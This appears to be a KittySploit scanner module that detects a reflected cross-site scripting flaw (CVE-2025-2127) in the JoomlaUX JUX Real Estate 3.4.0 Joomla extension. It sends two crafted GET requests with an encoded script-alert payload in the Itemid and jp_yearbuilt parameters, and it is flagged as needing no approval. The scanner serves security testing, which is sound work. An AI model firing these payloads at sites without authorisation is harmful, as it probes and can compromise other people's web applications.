#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""A vulnerability was found in JoomlaUX JUX Real Estate 3."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'JoomlaUX JUX Real Estate 3.4.0 - Reflected XSS Detection',
        'description': 'A vulnerability was found in JoomlaUX JUX Real Estate 3.4.0 on Joomla. It has been classified as problematic. Affected is an unknown function of the file /extensions/realestate/index.php/properties/list/list-with-sidebar/realties. The manipulation of the argument Itemid/jp_yearbuilt leads to cross site scripting. It is possible to launch the attack remotely. The exploit has been disclosed to the public and may be used. The vendor was contacted early about this disclosure but did not respond in any way.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2025', 'joomlaux', 'joomla', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2025-2127',
            'https://vuldb.com/?id.299040',
            'https://vuldb.com/?ctiid.299040',
        ],
        'cve': 'CVE-2025-2127',
    }

    def run(self):
        for path in ('/extensions/realestate/index.php/properties/list/list-with-sidebar/realties?option=com_jux_real_estate&view=realties&Itemid=6wdv%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3Ewz8nu&title=&price_slider_lower=63752&price_slider_upper=400000&area_slider_lower=30&area_slider_upper=400&type_id=2&cat_id=8&country_id=73&locstate=187&beds=1&agent_id=112&baths=1&jp_yearbuilt=&button=Search', '/extensions/realestate/index.php/properties/list/list-with-sidebar/realties?option=com_jux_real_estate&view=realties&Itemid=148&title=&price_slider_lower=63752&price_slider_upper=400000&area_slider_lower=30&area_slider_upper=400&type_id=2&cat_id=8&country_id=73&locstate=187&beds=1&agent_id=112&baths=1&jp_yearbuilt=mzbpj%22%3e%3cscript%3ealert(document.domain)%3c%2fscript%3eflmo8&button=Search'):
            r = self.http_request(method='GET', path=path, allow_redirects=False)
            if not r or r.status_code != 200:
                continue
            body = r.text or ""
            content_type = r.headers.get("Content-Type") or r.headers.get("content-type") or ""
            body_all = ('<script>alert(document.domain)</script>', 'joomlaux',)
            ctype_any = ('text/html',)
            if (all(m in body for m in body_all)) and (any(m in content_type for m in ctype_any)):
                self.set_info(
                    severity='medium',
                    reason='JoomlaUX JUX Real Estate 3.4.0 - Reflected XSS detected',
                    path=path,
                )
                return True
        return False

